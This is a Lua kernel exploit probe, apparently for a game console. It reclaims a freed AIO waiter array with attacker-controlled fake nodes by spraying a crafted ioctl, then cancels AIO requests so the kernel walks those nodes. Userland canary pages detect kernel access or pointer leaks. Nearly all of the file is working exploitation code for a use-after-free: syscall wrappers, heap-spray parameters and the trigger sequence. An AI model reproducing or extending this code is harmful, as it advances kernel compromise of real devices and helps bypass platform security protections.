-- CRASH_CLASS: HIGH
-- PROBE 782a: can a freed waiter array be reclaimed with attacker bytes?
--
-- Context: multi_wait(ids, n, states, 0, us) allocates count*0x18 bytes of
-- waiters, links them into the requests, waits, then frees the array at
-- 0x8ad70a87 before its own cleanup loop walks the records again (0x8ad70de3:
-- [record+0x18] -> 0x8b5b1770). The released exploit reclaims that chunk with
-- attacker bytes via ioctl(-1, 0x80000000|(size<<16)|0x4101, nodes) and then
-- cancels requests so the aio code walks its own fake nodes.
--
-- This probe uses userland canary pages instead of kernel addresses: every
-- pointer-shaped field of the fake node points at a page we own, so any kernel
-- access through them either lands in our page (visible, and a leak if the
-- kernel writes a pointer) or faults (SMAP on -> the console takes the hit).
-- Nothing kernel-addressable is required, and nothing is written to the kernel.

print("=== PROBE 782a: WAITER RECLAIM ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end

-- canary pages
local CA = to_num(memory.alloc(0x8000))
local CB = to_num(memory.alloc(0x8000))
for i = 0, 0x1FFF do wd(CA + i * 4, 0x00) end
for i = 0, 0x1FFF do wd(CB + i * 4, 0x00) end
print(string.format("[0] canary A=%s B=%s", hx(CA), hx(CB)))

local function canary_dirty()
    local n = 0
    for i = 0, 0x1FFF do
        if rd(CA + i * 4) ~= 0 then n = n + 1 end
        if rd(CB + i * 4) ~= 0 then n = n + 1 end
    end
    return n
end
local function canary_first()
    for i = 0, 0x1FFF do
        local v = rd(CA + i * 4)
        if v ~= 0 then return "A", i, v end
        local w = rd(CB + i * 4)
        if w ~= 0 then return "B", i, w end
    end
    return nil
end

local sink   = to_num(memory.alloc(0x2000))
local req    = to_num(memory.alloc(0x1000))
local ids    = to_num(memory.alloc(0x400))
local states = to_num(memory.alloc(0x400))
local idout  = to_num(memory.alloc(0x40))
local tmo    = to_num(memory.alloc(0x40))
local fds    = to_num(memory.alloc(64))

local SOCKETPAIR, IOCTL = 135, 54
local AIO_DEL, AIO_WAIT, AIO_POLL, AIO_CANCEL, AIO_SUBMIT = 662, 663, 664, 666, 669

local N = 18
local WAITER = N * 0x18

-- fake nodes: stride 0x28 like the exploit, pointers into our canaries
local nodes = to_num(memory.alloc(0x4000))
local NNODES = 24
for i = 0, NNODES - 1 do
    local base = i * 0x28
    wq(nodes + base + 0x00, U(CA))
    wq(nodes + base + 0x08, U(CB))
    wq(nodes + base + 0x10, U(CA + 0x100))
    wq(nodes + base + 0x18, U(CA + 0x200))
    wq(nodes + base + 0x20, U(CA + 0x300))
end
print(string.format("[0b] nodes=%s churn size=0x%X", hx(nodes), WAITER))

local pr = sgn(make_syscall(SOCKETPAIR)(U(1), U(1), U(0), U(fds), Z, Z))
local rfd = rd(fds)
print(string.format("[A] socketpair=%d rfd=%d", pr, rfd))
if pr ~= 0 then return end

local function submit(slot, fd)
    wq(req + slot * 0x40 + 0x00, Z)
    wq(req + slot * 0x40 + 0x08, U(16))
    wq(req + slot * 0x40 + 0x10, U(sink + slot * 0x40))
    wq(req + slot * 0x40 + 0x18, U(sink + 0x1000 + slot * 8))
    wd(req + slot * 0x40 + 0x20, fd)
    wd(req + slot * 0x40 + 0x24, 0)
    local r = sgn(make_syscall(AIO_SUBMIT)(U(1), U(req + slot * 0x40), U(1), U(3), U(idout), Z))
    return r, rd(idout)
end
local function poll_n(n)
    wd(states, 0xDEADBEEF)
    local r = sgn(make_syscall(AIO_POLL)(U(ids), U(n), U(states), Z, Z, Z))
    local parts = {}
    for i = 0, n - 1 do parts[#parts + 1] = hx(rd(states + i * 4)) end
    return r, table.concat(parts, " ")
end

for i = 0, N - 1 do
    local r, id = submit(i, rfd)
    wd(ids + i * 4, id)
    if i < 3 then print(string.format("[A%d] submit=%d id=%s", i, r, hx(id))) end
end
local _, st = poll_n(N)
print(string.format("[A2] poll states=%s", st))

-- the wait that allocates and frees the waiter array
wd(tmo, 10000)
wd(states, 0xDEADBEEF)
local wr = sgn(make_syscall(AIO_WAIT)(U(ids), U(N), U(states), Z, U(tmo), Z))
print(string.format("[B] wait ret=%d states=%s", wr, hx(rd(states))))

-- churn the waiter-sized allocation with our fake nodes
local cmd = 2147483648 + WAITER * 0x10000 + 0x4101
print(string.format("[C] churn cmd=%s size=0x%X", hx(cmd), WAITER))
for i = 1, 32 do
    local r = sgn(make_syscall(IOCTL)(U(0xFFFFFFFF), U(cmd), U(nodes), Z, Z, Z))
    if i == 1 or i == 32 then print(string.format("[C%d] churn ret=%d", i, r)) end
end
print(string.format("[C2] canary dirty after churn=%d", canary_dirty()))

-- cancel each id: if a request still references the reclaimed array, the aio
-- code walks our fake nodes here
for i = 0, N - 1 do
    wd(ids, rd(ids + i * 4))
    wd(states, 0xDEADBEEF)
    local cr = sgn(make_syscall(AIO_CANCEL)(U(ids), U(1), U(states), Z, Z, Z))
    local d = canary_dirty()
    local t, off, val = canary_first()
    if i < 4 or d ~= 0 then
        print(string.format("[D%d] cancel ret=%d state=%s dirty=%d first=%s+0x%X:%s",
            i, cr, hx(rd(states)), d, tostring(t), off or 0, val and hx(val) or "-"))
    end
    if d ~= 0 then break end
end

print(string.format("[E] canary dirty=%d", canary_dirty()))
local _, st2 = poll_n(3)
print(string.format("[F] poll first3 states=%s", st2))
print("=== PROBE 782a DONE ===")
